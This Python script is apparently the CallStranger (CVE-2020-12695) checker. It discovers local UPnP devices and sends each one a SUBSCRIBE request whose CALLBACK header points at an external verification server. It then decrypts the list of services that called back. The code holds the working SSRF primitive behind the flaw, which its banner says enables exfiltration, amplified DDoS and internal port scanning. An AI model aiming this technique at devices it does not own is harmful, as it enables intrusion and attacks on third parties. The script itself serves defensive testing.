import os
import sys, getopt
import upnpy
import requests
import uuid
import socket
import cryptography
import time
from cryptography.fernet import Fernet
from sys import platform

from termcolor import colored, cprint

if(sys.platform=='win32'):
	os.system('color')


print( colored('_________        .__  .__    _________ __                                              ','green'))
print( colored('\_   ___ \_____  |  | |  |  /   _____//  |_____________    ____    ____   ___________  ','green'))
print( colored('/    \  \/\__  \ |  | |  |  \_____  \\   __\_  __ \__  \  /    \  / ___\_/ __ \_  __ \ ','green'))
print( colored('\     \____/ __ \|  |_|  |__/        \|  |  |  | \// __ \|   |  \/ /_/  >  ___/|  | \/ ','green'))
print( colored(' \______  (____  /____/____/_______  /|__|  |__|  (____  /___|  /\___  / \___  >__|    ','green'))
print( colored('        \/     \/                  \/                  \/     \//_____/      \/        ','green'))
print('This script created by Yunus Çadırcı (https://twitter.com/yunuscadirci) to check against CallStranger (CVE-2020-12695) vulnerability. An attacker can use this vulnerability for:')
print('* Bypassing DLP for exfiltrating data')
print('* Using millions of Internet-facing UPnP device as source of amplified reflected TCP DDoS / SYN Flood')
print('* Scanning internal ports from Internet facing UPnP devices')
print('You can find detailed information on https://www.callstranger.com  https://kb.cert.org/vuls/id/339275 https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-12695')
print('Slightly modified version of https://github.com/5kyc0d3r/upnpy used for base UPnP communication')

def subscribe(URL,callbackURL):
	myheaders = {
	'User-Agent':'Callstranger Vulnerability Checker',
    'CALLBACK': '<'+callbackURL+'>',
    'NT': 'upnp:event',
    'TIMEOUT': 'Second-300'} 
	#print(URL,callbackURL,'sending')
	req = requests.request('SUBSCRIBE', URL,headers=myheaders)
	if req.status_code==200:
		print(colored('Subscribe to '+URL+' seems successfull','green'))
		print(req.headers)
		print(req.text)
	else:
		print(colored('Subscribe to '+URL+' failed with status code:'+str(req.status_code),'red'))
		print(req.headers)
		print(req.text)
	
	
	

def getsession(path):
	session=''
	try:
		getses=requests.request('PUT',path)
		session=getses.text
		print(colored('Successfully get session:'+session,'green'))
	except:
		print(colored('Could not  contact server',path,' for vulnerability confirmation','red'))
	return session
	
def confirmvulnerableservices(path,key):
	vulnerableservices=''
	try:
		getservices=requests.request('PUT',path)
		vulnerableservices=getservices.text
		print(colored('Successfully get services from server: '+path,'green'))
		print('')
		print('Encrypted vulnerable services:')
		print(vulnerableservices);
		print('')
		print('Decyripting vulnerable services with key:' , key)
		f = Fernet(key)
		i=1
		decryiptedvulnerableservices=[]
		print(colored('\nVerified vulnerable services: ','red'))
		for line in vulnerableservices.splitlines():
			print(colored(str(i)+':	'+f.decrypt(line.encode()).decode(),'red'))
			decryiptedvulnerableservices.append(f.decrypt(line.encode()).decode())
			i=i+1
			
		unverifiedservices=Diff(services,decryiptedvulnerableservices)
		
		print(colored('\nUnverified  services: ','yellow'))
		i=1
		for unverifiedservice in unverifiedservices:
			print(colored(str(i)+':	'+unverifiedservice,'yellow'))
			i=i+1
	except:
		print(colored('Could not get services from server',path,' for vulnerability confirmation','red'))

def Diff(li1, li2): 
    li_dif = [i for i in li1 + li2 if i not in li1 or i not in li2] 
    return li_dif 


	
services=[]
serviceeventSubURLs=[]
dummyservicekeywords=['dummy','notfound']
# this host must be external so you can be sure that devices are vulnerable. Most of UPnP stacks don't allow hostname. use IP if possible
StrangerHost='http://'+socket.gethostbyname('verify.callstranger.com')
StrangerPort='80'
getSessionPath='/CallStranger.php?c=getsession'
putServicePath='/CallStranger.php?c=addservice&service=' # this HTTP request verb is NOTIFY , your web server must respond to NOTIFY
getVulnerableServicesPath='/CallStranger.php?c=getservices'
print('Stranger Host:',StrangerHost)
print('Stranger Port:',StrangerPort)

upnp = upnpy.UPnP()

# Discover UPnP devices on the network

devices = upnp.discover()
if len(devices)>0:
	print(colored(len(devices),'blue') , colored(' devices found:','blue'))

	for device in devices:
		print('\n',colored(str(device.friendly_name),'yellow') ,str(device.base_url),'(',str(device.document_location),')')
		tmpservices=device.get_services()
		print(colored('\n  ' +str(len(tmpservices)) + ' service(s) found for '+str(device.friendly_name),'yellow'))
		for tmpservice in tmpservices:
			print('    ',str(tmpservice.service), "	-->",str(device.base_url)+str(tmpservice.event_sub_url),  )
			if any(x in  str(tmpservice.event_sub_url) for x in dummyservicekeywords):
				print('     --skipping ',str(device.base_url)+str(tmpservice.event_sub_url) ,'because it contains dummy service keywords')
			else:
				services.append(str(device.base_url)+str(tmpservice.event_sub_url))
			
	print('\n','Total', len(services), 'service(s) found. do you want to continue to VERIFY if service(s) are vulnerable?')
	print(colored('Be careful: This operation needs Internet access and may transfer data about devices over network. Data encrypted on local and we can not see which services are vulnerable but ISPs and other elements may be able to inspect HTTP headers created by UPnP device. Because most of UPnPstack do not allow SSL connection we can not use it. ','red'))
	if input('Do you want to continue? y/N ') == 'y':
		
		ss=getsession(StrangerHost+':'+StrangerPort+getSessionPath)
		key = Fernet.generate_key()
		f=Fernet(key)
		print('Symmetric random key for encryption:',key,' We do not send this value to server so we can not see which services are vulnerable. All confirmation process is done on client side' )
		for serv in services:
		
			path=StrangerHost+':'+StrangerPort+putServicePath+f.encrypt(serv.encode()).decode()+'&token='+ss
			print('Calling stranger for ', serv, 'with',path)
			subscribe(serv,path)
			
		print(colored('\n	Waiting 5 second for asynchronous requests','yellow'))
		time.sleep(5) 
		vulnerabilityconfirmationpath=StrangerHost+':'+StrangerPort+getVulnerableServicesPath+'&token='+ss
		confirmvulnerableservices(vulnerabilityconfirmationpath,key)
		

else:
	print( colored('No UPnP device found. Possible reasons: ','yellow'))
	print( colored('* You just connected to network.','yellow'))
	print( colored('* UPnP stack is too slow. Restart this script','yellow'))
	print( colored('* UPnP is disabled on OS.','yellow'))
	print( colored('* UPnP is disabled on devices.','yellow'))
	print( colored('* There is no UPnP supported device.','yellow'))
	print( colored('* Your OS works on VM with NAT configuration.','yellow'))

print('\n	Visit https://www.CallStranger.com for updates')

